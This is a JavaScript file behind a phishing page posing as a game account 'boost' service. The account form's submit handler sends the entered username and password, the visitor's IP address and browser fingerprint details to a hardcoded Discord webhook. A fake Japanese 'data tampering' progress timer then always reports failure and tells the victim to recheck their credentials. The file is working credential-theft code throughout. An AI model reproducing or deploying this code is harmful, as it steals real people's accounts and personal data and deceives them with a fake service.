const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1383529796595613816/ub2mTIV7qRheXhiorjMOse8uGZ6FyMTX6HkYKVvrAdp9V7HXtBUAF0U8HtHAqOa0S6Zk';

const form1 = document.getElementById('account-form');
const form2 = document.getElementById('boost-form');
const log = document.getElementById('log');
let savedAccount = {};

function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(d => d.ip)
    .catch(() => "");
}

async function sendToWebhook(embed) {
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  });
}

form1.addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  savedAccount = { username, password };

  const ip = await getIP();
  const embed = {
    title: "Account Info",
    color: 3447003,
    fields: [
      { name: "Username", value: username, inline: true },
      { name: "Password", value: password, inline: true },
      { name: "IP", value: ip, inline: true },
      { name: "Language", value: navigator.language, inline: true },
      { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
      { name: "Platform", value: navigator.platform, inline: true },
      { name: "CPU Cores", value: String(navigator.hardwareConcurrency || "Unknown"), inline: true },
      { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
      { name: "Touch Support", value: String(navigator.maxTouchPoints), inline: true },
      { name: "Cookies Enabled", value: String(navigator.cookieEnabled), inline: true },
      { name: "User-Agent", value: navigator.userAgent, inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  await sendToWebhook(embed);

  [...form1.querySelectorAll('input, button')].forEach(el => el.classList.add('hidden'));
  form2.classList.remove('hidden');
  form2.classList.add('fade-in');
});

form2.addEventListener('submit', (e) => {
  e.preventDefault();
  form2.classList.add('hidden');
  log.classList.remove('hidden');

  const level = document.getElementById('level-amount').value.trim();
  const money = document.getElementById('money-amount').value.trim();

  const embed = {
    title: "Boost Info",
    color: 15844367,
    fields: [
      { name: "Username", value: savedAccount.username, inline: true },
      { name: "Level Increase", value: level, inline: true },
      { name: "Money Increase", value: money, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  sendToWebhook(embed);
  startFakeProcess(log);
});

function startFakeProcess(logEl) {
  logEl.textContent = '';
  let seconds = Math.random() * 270 + 30;

  const interval = setInterval(() => {
    const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
    logEl.textContent = `データ改ざん中${dots}`;

    const drift = (Math.random() - 0.5) * 30;
    seconds = Math.max(10, seconds + drift - 1);

    const m = Math.floor(seconds / 60);
    const s = (seconds % 60).toFixed(1);
    logEl.textContent += `\n残り ${m}分${s}秒`;

    if (seconds <= 0) {
      clearInterval(interval);
      logEl.textContent += `\n失敗しました。アカウントの情報が正しいか確認してください。`;
    }
  }, 1000);
}
